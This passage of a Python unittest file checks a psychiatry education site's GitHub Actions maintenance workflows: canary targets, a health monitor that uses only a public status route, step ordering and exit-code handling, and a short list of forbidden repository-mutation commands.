            "https://mmc-psychiatry-residents-sanford.netlify.app",
            smoke_runs,
        )

        build_runs = "\n".join(
            step.get("run", "") for step in build_steps
        )
        self.assertIn(
            "python3 -m unittest discover -s tests/maintenance -p 'test_*.py' -v",
            build_runs,
        )
        self.assertIn("validate_scheduled_workflows.py", build_runs)
        self.assertIn("node --test tests/*.test.mjs", build_runs)

    def test_production_canary_runs_both_public_canary_projects(self):
        runs = "\n".join(
            step.get("run", "")
            for step in steps("maintenance-production-canary.yml")
        )
        self.assertIn("--project=canary-ms3", runs)
        self.assertIn("--project=canary-res", runs)
        self.assertIn("production_canary.py", runs)
        # The nav-* projects carry the client-runtime fault-injection suites. Against live
        # Netlify they yield transport noise and no production signal (the 2026-08-21..09-02
        # daily-red regression), so the canary must never fall back to them.
        self.assertNotIn("--project=nav-ms3", runs)
        self.assertNotIn("--project=nav-res", runs)
        env_values = json_values(load_workflow("maintenance-production-canary.yml"))
        self.assertIn("https://une-ms3-psychiatry.netlify.app", env_values)
        self.assertIn(
            "https://mmc-psychiatry-residents-sanford.netlify.app",
            env_values,
        )

    def test_sp_monitor_calls_only_public_content_free_status_route(self):
        runs = "\n".join(
            step.get("run", "")
            for step in steps("maintenance-sp-health-monitor.yml")
        )
        self.assertIn(
            "https://sp-interview-proxy.netlify.app/api/sp/health-status",
            runs,
        )
        scrubbed = runs.replace(
            "https://sp-interview-proxy.netlify.app/api/sp/health-status",
            "",
        )
        self.assertNotIn("/api/sp", scrubbed)
        self.assertNotIn("passcode", runs.lower())
        self.assertNotIn("student-key", runs.lower())

    def test_review_workflows_upload_then_route_then_restore_exit_code(self):
        for name, step_id in (
            ("maintenance-governance-digest.yml", "governance"),
            ("maintenance-monthly-review.yml", "monthly"),
        ):
            workflow_steps = steps(name)
            upload_index = next(
                index
                for index, step in enumerate(workflow_steps)
                if step.get("id") == "upload"
            )
            route_index = next(
                index
                for index, step in enumerate(workflow_steps)
                if "maintenance_issue.py" in step.get("run", "")
            )
            enforce_index = next(
                index
                for index, step in enumerate(workflow_steps)
                if step.get("id") == "enforce"
            )
            self.assertLess(upload_index, route_index, name)
            self.assertLess(route_index, enforce_index, name)
            self.assertEqual(workflow_steps[upload_index].get("if"), "always()")
            self.assertEqual(workflow_steps[route_index].get("if"), "always()")
            route_values = json_values(workflow_steps[route_index])
            self.assertIn("${{ steps.upload.outputs.artifact-url }}", route_values)
            self.assertTrue(
                any(
                    f"${{{{ steps.{step_id}.outputs.exit_code }}}}" in str(value)
                    for value in json_values(workflow_steps[enforce_index])
                ),
                name,
            )

    def test_rotation_captures_ten_routes_after_upload_and_translates_exit(self):
        workflow_steps = steps("maintenance-rotation-readiness.yml")
        rotation_index = next(
            index for index, step in enumerate(workflow_steps)
            if step.get("id") == "rotation"
        )
        upload_index = next(
            index for index, step in enumerate(workflow_steps)
            if step.get("id") == "upload"
        )
        route_index = next(
            index for index, step in enumerate(workflow_steps)
            if "maintenance_issue.py" in step.get("run", "")
        )
        enforce_index = next(
            index for index, step in enumerate(workflow_steps)
            if step.get("id") == "enforce"
        )
        self.assertLess(rotation_index, upload_index)
        self.assertLess(upload_index, route_index)
        self.assertLess(route_index, enforce_index)
        self.assertIn("set +e", workflow_steps[rotation_index]["run"])
        self.assertIn("exit_code", workflow_steps[rotation_index]["run"])
        self.assertIn(
            "steps.rotation.outputs.exit_code == '10'",
            workflow_steps[route_index]["if"],
        )
        enforce_run = workflow_steps[enforce_index]["run"]
        self.assertIn('"0"|"10"', enforce_run)
        self.assertIn("exit", enforce_run)

    def test_workflows_contain_no_forbidden_mutation_or_baseline_commands(self):
        forbidden = (
            "--update-snapshots",
            "update-baselines",
            "git push origin main",
            "git push main",
            "issue close",
            "gh issue close",
            "reviewed.json",
            "question_bank.json",
        )
        for name in [*EXPECTED, "surveillance-resource-intake.yml"]:
            runs = "\n".join(
                step.get("run", "") for step in steps(name)
            ).lower()
            for token in forbidden:
                self.assertNotIn(token.lower(), runs, f"{name}: {token}")


def json_values(value):
    if isinstance(value, dict):
        return [
            item
            for nested in value.values()
            for item in json_values(nested)
        ]
    if isinstance(value, list):
        return [item for nested in value for item in json_values(nested)]
    return [value]


if __name__ == "__main__":
    unittest.main()
